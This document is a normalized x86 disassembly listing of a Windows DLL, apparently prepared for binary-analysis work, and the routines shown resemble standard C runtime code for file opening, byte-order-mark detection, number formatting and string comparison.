mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1000db2f
add esp 0x10
cmp eax ebx
je r-xdata
sub_1000aac7
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000dca7
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_1000496c
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
cmp ecx 0xffffffff
lea edi [ eax + esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1000db2f
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000a34f
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1000a919
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_1000abbf
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a4bc
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000aa0e
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a5a8
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000aac7
jmp r-xdata
sub_1000ac45
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000abbf
add esp 0x1c
pop ebp
retn
sub_1000ac66
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_100042b4
add edi 0x4
cmp edi 0x28
pop ecx
mov [ esi ] eax
jb r-xdata
pop edi
pop esi
retn
sub_1000ac85
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1000de48
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
sub_1000acae
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_1000acea
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_1000acae
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_1000ad13
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
cmp edi esi
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
test ebx ecx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x14 ] ebx
mov [ eax ] edi
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
cmp esi ecx
mov [ ebp - 0x10 ] edx
jb r-xdata
inc [ eax + 0x8 ]
test esi esi
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
test ebx ebx
mov [ eax + 0x4 ] esi
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
test edx edx
mov [ eax + 0x4 ] ecx
je r-xdata
sub_1000aedf
push 0x10
push r--data
call sub_10005acc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000af75
mov eax [ ebp - 0x1c ]
call sub_10005b11
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1000318b
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_100063a9
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_1000af7e
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push edi
push 0x10
mov esi eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] ebx
pop edi
je r-xdata
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_10007fad
test eax eax
pop ecx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call sub_1000e7a6
test eax eax
pop ecx
je r-xdata
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
mov eax [ ebp + 0x10 ]
push 0x3
pop edx
and eax edx
sub eax ebx
mov ecx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] ecx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x14 ] eax
je r-xdata
mov [ ebp - 0x8 ] ebx
sub eax edi
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
call sub_100049de
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_100049cb
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000496c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
jg r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
sub eax edi
je r-xdata
mov eax esi
jmp r-xdata
test cl 0x40
je r-xdata
mov edx [ rw-data ]
not edx
and edx [ ebp + 0x18 ]
test dl dl
js r-xdata
mov [ ebp - 0x10 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x100
test eax ecx
mov edi 0x80
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test cx 0x1000
je r-xdata
or [ ebp - 0xc ] 0x10000
or edi 0x4000000
cmp [ ebp - 0x18 ] 0x2
jne r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
xor eax eax
cmp [ ebp - 0xc ] ecx
sete al
mov [ ebp - 0x8 ] eax
jmp r-xdata
test cl 0x20
je r-xdata
or edi eax
or [ ebp - 0x8 ] 0x4
cmp eax 0x300
jne r-xdata
test cl 0x10
je r-xdata
or edi 0x8000000
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
call sub_1000bf88
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
or edi __dos_header
mov eax [ ebp + 0x8 ]
push ebx
push edi
push [ ebp - 0x10 ]
mov [ eax ] 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_100049de
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_100049cb
mov [ eax ] 0x18
jmp r-xdata
push edi
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call sub_100049cb
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100049f1
push edi
push [ esi ]
call sub_1000bd57
mov eax [ esi ]
mov edx eax
and eax 0x1f
imul eax eax 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
imul eax eax 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] bl
mov [ eax ] cl
jne r-xdata
mov ecx 0x74000
test [ ebp + 0x10 ] ecx
mov edi 0x4000
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax ecx
cmp eax edi
je r-xdata
mov eax [ ebp - 0x14 ]
and eax ecx
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_10005e1b
add esp 0xc
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] edi
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_1000e148
add esp 0xc
test eax eax
jne r-xdata
call sub_100049de
cmp [ eax ] 0x83
je r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x8 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_10005e1b
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_10006437
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
push edx
push eax
push [ esi ]
call sub_1000df94
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
call sub_1000e148
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x8 ] 0xbfbbef
mov [ ebp - 0x10 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_1000c208
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x8 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x10 ] edi
jg r-xdata
mov [ ebp - 0x8 ] 0xfeff
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_1000c208
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_10006437
pop ecx
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_10005e1b
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x8 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x8 ]
push eax
push [ esi ]
call sub_10006cea
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_10005e1b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_1000c208
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_1000c208
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_1000b5bc
push 0x14
push r--data
call sub_10005acc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_100049cb
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_1000496c
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_10005b11
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_1000af7e
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b65a
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_1000b65a
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_1000bf66
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
imul eax eax 0x28
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1000b6a6
push ebp
mov ebp esp
sub esp 0x14
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_100027e4
mov edx [ ebp + 0x8 ]
xor esi esi
cmp edx esi
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx esi
jne r-xdata
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi 0x200
lea eax [ ebp - 0x14 ]
push eax
push ebx
push edx
call sub_1000d711
add esp 0xc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
leave
retn
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ edx ] 0x0
jne r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx esi dx
movzx cx [ ecx + 0x11d ]
movzx esi cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
dec edx
push edx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10009047
add esp 0x24
cmp eax 0x1
jne r-xdata
xor esi esi
jmp r-xdata
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx cx [ ebx ]
movzx ecx cx
movzx edx cl
inc ebx
test [ edx + eax + 0x1d ] 0x4
je r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
lea ecx [ ebx - 0x1 ]
push ecx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10009047
add esp 0x24
cmp eax 0x1
jne r-xdata
xor ecx ecx
jmp r-xdata
call sub_100049cb
mov [ eax ] 0x16
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx ax [ ebp - 0x4 ]
movzx cx [ ebp - 0x3 ]
shl ax 0x8
add ax cx
inc [ ebp + 0x8 ]
movzx esi ax
mov eax [ ebp - 0x10 ]
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
cmp cx si
jne r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
jmp r-xdata
movzx ax [ ebp - 0x4 ]
movzx cx [ ebp - 0x3 ]
shl ax 0x8
add ax cx
movzx ecx ax
mov eax [ ebp - 0x10 ]
inc ebx
jmp r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
movzx cx [ edx ]
movzx ecx cx
movzx esi cl
inc edx
test [ esi + eax + 0x1d ] 0x4
mov [ ebp + 0x8 ] edx
je r-xdata
sub_1000b8d3
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002c06
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx cx [ eax ]
dec [ ebp + 0x10 ]
movzx ecx cx
movzx edx cl
inc eax
test [ edx + edi + 0x1d ] 0x4
mov [ ebp + 0x8 ] eax
je r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
jne r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
xor edx edx
inc [ ebp + 0x8 ]
mov dh cl
mov dl al
movzx ecx dx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
xor ebx ebx
mov bh al
inc esi
mov bl dl
movzx eax bx
xor ebx ebx
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000ba6d
push 0x14
push r--data
call sub_10005acc
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_10004320
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_10007fad
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_10005b11
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10004870
add esp 0x14
mov esi sub_1000ba5d
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
